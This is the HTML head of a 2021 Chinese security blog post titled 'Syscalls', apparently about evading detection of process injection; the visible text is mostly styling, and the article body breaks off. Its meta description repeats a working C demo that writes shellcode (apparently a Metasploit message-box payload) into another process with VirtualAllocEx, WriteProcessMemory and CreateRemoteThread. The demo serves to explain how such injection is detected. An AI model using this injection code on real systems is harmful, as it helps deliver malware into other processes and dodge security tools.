@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.88.1" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Muxue" />
+  <meta property="og:url" content="https://secxue.github.io/posts/syscalls/" />
+  <link rel="canonical" href="https://secxue.github.io/posts/syscalls/" /><link rel="alternate" type="application/atom+xml" href="https://secxue.github.ioindex.xml" title="Muxue Blog">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "https:\/\/secxue.github.io"
+      },
+      "articleSection" : "posts",
+      "name" : "Syscalls",
+      "headline" : "Syscalls",
+      "description" : "这个我真的鸽了很久\n区别 传统的进程注入有那些API非常的明显，拿个demo演示\n#include \u0026lt;windows.h\u0026gt;#include \u0026lt;stdio.h\u0026gt; int main(int argc,char* argv[]) { char buf[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\\x51\u0026#34; \u0026#34;\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x3e\\x48\u0026#34; \u0026#34;\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\\x50\\x3e\\x48\u0026#34; \u0026#34;\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\u0026#34; \u0026#34;\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x3e\u0026#34; \u0026#34;\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x3e\\x8b\\x80\\x88\u0026#34; \u0026#34;\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\u0026#34; \u0026#34;\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\u0026#34; \u0026#34;\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\u0026#34; \u0026#34;\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\u0026#34; \u0026#34;\\x08\\x45\\x39\\xd1\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\u0026#34; \u0026#34;\\x66\\x3e\\x41\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\u0026#34; \u0026#34;\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\u0026#34; \u0026#34;\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x49\\xc7\\xc1\u0026#34; \u0026#34;\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\xfe\\x00\\x00\\x00\\x3e\\x4c\\x8d\u0026#34; \u0026#34;\\x85\\x0f\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\\x45\\x83\\x56\\x07\\xff\u0026#34; \u0026#34;\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x65\\x6c\u0026#34; \u0026#34;\\x6c\\x6f\\x2c\\x20\\x66\\x72\\x6f\\x6d\\x20\\x4d\\x53\\x46\\x21\\x00\\x4d\u0026#34; \u0026#34;\\x65\\x73\\x73\\x61\\x67\\x65\\x42\\x6f\\x78\\x00\u0026#34;; int len = sizeof(buf); if (argc != 2) { \/\/ 给注入进程的PID  printf(\u0026#34;[!] Usage: %s \u0026lt;pid to inject into\u0026gt;\\n\u0026#34;, argv[0]); return EXIT_FAILURE; } auto pid = atoi(argv[1]); \/\/ atoi把字符串转换为整数  if (!pid) { \/\/ 判断  printf(\u0026#34;[-] Invalid PID: %s\\n\u0026#34;, argv[1]); return EXIT_FAILURE; } HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid); LPVOID Address = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); \/\/ LPVOID: 指向任何类型的指针  \/\/printf(\u0026#34;%d\u0026#34;, len);  WriteProcessMemory(hProcess, Address, buf, len, NULL); CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Address, 0, 0, 0); return 1; } 这种静态分析也很容易就被发现了，用strings和ida分别看下",
+      "inLanguage" : "en-US",
+      "author" : "Muxue",
+      "creator" : "Muxue",
+      "publisher": "Muxue",
+      "accountablePerson" : "Muxue",
+      "copyrightHolder" : "Muxue",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-12-06 22:14:22 \u002b0800 CST",
+      "dateModified" : "2021-12-06 22:14:22 \u002b0800 CST",
+      "url" : "https:\/\/secxue.github.io\/posts\/syscalls\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>Syscalls</title>
+  <meta property="og:title" content="Syscalls" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="这个我真的鸽了很久
+区别 传统的进程注入有那些API非常的明显，拿个demo演示
+#include &amp;lt;windows.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(int argc,char* argv[]) { char buf[] = &amp;#34;\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51&amp;#34; &amp;#34;\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48&amp;#34; &amp;#34;\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48&amp;#34; &amp;#34;\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02&amp;#34; &amp;#34;\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e&amp;#34; &amp;#34;\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88&amp;#34; &amp;#34;\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48&amp;#34; &amp;#34;\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e&amp;#34; &amp;#34;\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41&amp;#34; &amp;#34;\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24&amp;#34; &amp;#34;\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0&amp;#34; &amp;#34;\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e&amp;#34; &amp;#34;\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41&amp;#34; &amp;#34;\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&amp;#34; &amp;#34;\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1&amp;#34; &amp;#34;\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d&amp;#34; &amp;#34;\x85\x0f\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff&amp;#34; &amp;#34;\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c&amp;#34; &amp;#34;\x6c\x6f\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d&amp;#34; &amp;#34;\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00&amp;#34;; int len = sizeof(buf); if (argc != 2) { // 给注入进程的PID  printf(&amp;#34;[!] Usage: %s &amp;lt;pid to inject into&amp;gt;\n&amp;#34;, argv[0]); return EXIT_FAILURE; } auto pid = atoi(argv[1]); // atoi把字符串转换为整数  if (!pid) { // 判断  printf(&amp;#34;[-] Invalid PID: %s\n&amp;#34;, argv[1]); return EXIT_FAILURE; } HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid); LPVOID Address = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // LPVOID: 指向任何类型的指针  //printf(&amp;#34;%d&amp;#34;, len);  WriteProcessMemory(hProcess, Address, buf, len, NULL); CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Address, 0, 0, 0); return 1; } 这种静态分析也很容易就被发现了，用strings和ida分别看下" />
+  <meta name="description" content="这个我真的鸽了很久
+区别 传统的进程注入有那些API非常的明显，拿个demo演示
+#include &amp;lt;windows.h&amp;gt;#include &amp;lt;stdio.h&amp;gt; int main(int argc,char* argv[]) { char buf[] = &amp;#34;\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51&amp;#34; &amp;#34;\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48&amp;#34; &amp;#34;\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48&amp;#34; &amp;#34;\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02&amp;#34; &amp;#34;\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e&amp;#34; &amp;#34;\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88&amp;#34; &amp;#34;\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48&amp;#34; &amp;#34;\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e&amp;#34; &amp;#34;\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41&amp;#34; &amp;#34;\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24&amp;#34; &amp;#34;\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0&amp;#34; &amp;#34;\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e&amp;#34; &amp;#34;\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41&amp;#34; &amp;#34;\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&amp;#34; &amp;#34;\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1&amp;#34; &amp;#34;\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d&amp;#34; &amp;#34;\x85\x0f\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff&amp;#34; &amp;#34;\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c&amp;#34; &amp;#34;\x6c\x6f\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d&amp;#34; &amp;#34;\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00&amp;#34;; int len = sizeof(buf); if (argc != 2) { // 给注入进程的PID  printf(&amp;#34;[!] Usage: %s &amp;lt;pid to inject into&amp;gt;\n&amp;#34;, argv[0]); return EXIT_FAILURE; } auto pid = atoi(argv[1]); // atoi把字符串转换为整数  if (!pid) { // 判断  printf(&amp;#34;[-] Invalid PID: %s\n&amp;#34;, argv[1]); return EXIT_FAILURE; } HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid); LPVOID Address = VirtualAllocEx(hProcess, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // LPVOID: 指向任何类型的指针  //printf(&amp;#34;%d&amp;#34;, len);  WriteProcessMemory(hProcess, Address, buf, len, NULL); CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Address, 0, 0, 0); return 1; } 这种静态分析也很容易就被发现了，用strings和ida分别看下" />
+  <meta property="og:locale" content="en-us" />
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Muxue Blog">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >Muxue</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="/about" target="_blank">About</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://twitter.com/secxue" target="_blank">Twitter</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">Syscalls</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
